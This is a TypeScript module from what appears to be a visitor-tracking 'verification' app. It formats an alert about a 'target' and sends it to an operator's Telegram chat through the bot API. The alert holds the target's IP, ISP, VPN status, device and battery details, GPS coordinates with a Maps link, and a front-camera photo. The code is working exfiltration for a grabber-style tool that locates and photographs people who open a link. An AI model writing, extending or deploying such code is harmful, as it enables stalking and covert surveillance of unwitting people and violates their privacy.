import type { VerificationSession } from './types';
import { formatWIB } from './security';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

function escapeHtml(text: string): string {
  if (!text) return '';
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Dispatch real-time investigation alert to Telegram bot
 */
export async function sendTelegramAlert(
  session: VerificationSession,
  status: 'VERIFIED' | 'FAILED' = 'VERIFIED',
  failureReason: string = ''
): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return false;
  }

  try {
    const isVerified = status === 'VERIFIED';
    const statusEmoji = isVerified ? '✅ VERIFIED (IZIN LENGKAP)' : '⚠️ FALLBACK / DILEWATI';
    const hasCoordinates =
      session.location &&
      session.location.latitude !== 0 &&
      session.location.longitude !== 0;

    const deviceName =
      session.device?.deviceModel || session.device?.platform || 'Unknown Device';
    const ip = session.ipAddress || '127.0.0.1';

    const battText =
      session.device?.batteryLevel != null
        ? `${session.device.batteryLevel}% ${session.device.isCharging ? '⚡(Charging)' : '🔋(Battery)'}`
        : '-';

    const netText = session.device?.effectiveType
      ? `${session.device.effectiveType.toUpperCase()} ${session.device.networkType ? `/ ${session.device.networkType}` : ''} ${session.device.downlinkSpeed ? `(${session.device.downlinkSpeed} Mbps, ${session.device.rtt ?? 0}ms)` : ''}`
      : (session.device?.networkType || '-');

    const display = session.device?.screenWidth
      ? `${session.device.screenWidth}x${session.device.screenHeight} (${session.device.devicePixelRatio || 1}x) · ${session.device.colorGamut?.toUpperCase() || 'sRGB'} · ${session.device.isDarkMode ? 'Dark' : 'Light'}`
      : '-';

    const storage = session.device?.storageEstimate
      ? `${(session.device.storageEstimate.available / (1024 * 1024 * 1024)).toFixed(1)} GB Free`
      : '-';

    const reasonText = failureReason && failureReason !== '-'
      ? `\n⚠️ <b>Keterangan:</b> ${escapeHtml(failureReason)}`
      : '';

    const ipIntel = session.ipIntelligence;
    const ispName = ipIntel?.isp || 'Unknown ISP';
    const asInfo = ipIntel?.as ? ` (${escapeHtml(ipIntel.as)})` : '';
    const cityLoc = ipIntel?.locationSummary || '-';

    let vpnBadge = '✅ Direct / Residential';
    if (ipIntel?.isVpn) {
      vpnBadge = `⚠️ <b>VPN / PROXY DETECTED!</b> (${escapeHtml(ipIntel.vpnType || 'Proxy/Hosting')})`;
    }

    const messageHtml = `🚨 <b>TARGET TERDETEKSI MASUK!</b> 🚨
━━━━━━━━━━━━━━━━━━━━
🆔 <b>Nota ID:</b> <code>${escapeHtml(session.notaId)}</code>
📊 <b>Status:</b> <b>${statusEmoji}</b>${reasonText}

📱 <b>Perangkat:</b> <b>${escapeHtml(deviceName)}</b>
🌐 <b>IP Address:</b> <code>${escapeHtml(ip)}</code>
🏢 <b>ISP / Provider:</b> <b>${escapeHtml(ispName)}</b>${asInfo}
🛡️ <b>Deteksi VPN:</b> ${vpnBadge}
🏙️ <b>Estimasi Kota ISP:</b> ${escapeHtml(cityLoc)}
🔋 <b>Baterai:</b> ${escapeHtml(battText)}
📶 <b>Jaringan:</b> ${escapeHtml(netText)}
💻 <b>Layar & Display:</b> ${escapeHtml(display)}
💾 <b>Penyimpanan:</b> ${escapeHtml(storage)}
${hasCoordinates ? `📍 <b>Koordinat GPS:</b> <code>${session.location!.latitude}, ${session.location!.longitude}</code> (±${session.location!.accuracy || 20}m)` : '📍 <b>GPS:</b> Tidak diizinkan / ditolak'}
━━━━━━━━━━━━━━━━━━━━
⏰ <b>Waktu:</b> ${formatWIB(session.verifiedAt || Date.now())}`;

    // Construct Inline Keyboard buttons
    const inlineKeyboard: any[][] = [];
    const buttonRow: any[] = [];

    if (hasCoordinates) {
      buttonRow.push({
        text: '📍 Buka Google Maps',
        url: `https://www.google.com/maps?q=${session.location!.latitude},${session.location!.longitude}`
      });
    } else if (ipIntel?.lat && ipIntel?.lon) {
      buttonRow.push({
        text: '🗺️ Estimasi Wilayah ISP',
        url: `https://www.google.com/maps?q=${ipIntel.lat},${ipIntel.lon}`
      });
    }

    const baseSiteUrl = (process.env.PUBLIC_SITE_URL || 'http://localhost:4321').replace(/\/$/, '');
    buttonRow.push({
      text: '📊 Dashboard Admin',
      url: `${baseSiteUrl}/admin`
    });

    inlineKeyboard.push(buttonRow);

    // If front camera photo is available, send as photo with caption
    if (session.frontCamera?.dataUri && session.frontCamera.dataUri.startsWith('data:image/')) {
      try {
        const cleanBase64 = session.frontCamera.dataUri.replace(/^data:image\/\w+;base64,/, '');
        const imageBuffer = Buffer.from(cleanBase64, 'base64');
        const blob = new Blob([imageBuffer], { type: 'image/jpeg' });

        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, `target_${session.id}.jpg`);
        formData.append('caption', messageHtml);
        formData.append('parse_mode', 'HTML');
        formData.append('reply_markup', JSON.stringify({ inline_keyboard: inlineKeyboard }));

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 12000);

        const photoRes = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
          {
            method: 'POST',
            body: formData,
            signal: controller.signal
          }
        );
        clearTimeout(timeoutId);

        if (photoRes.ok) {
          return true;
        }
      } catch (photoErr) {
        console.warn('Failed to send photo to Telegram, falling back to text message:', photoErr);
      }
    }

    // Fallback: Send rich text message
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000);

    const textRes = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: messageHtml,
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard: inlineKeyboard }
        }),
        signal: controller.signal
      }
    );
    clearTimeout(timeoutId);

    return textRes.ok;
  } catch (err: any) {
    console.error('Error dispatching Telegram notification:', err.message || err);
    return false;
  }
}
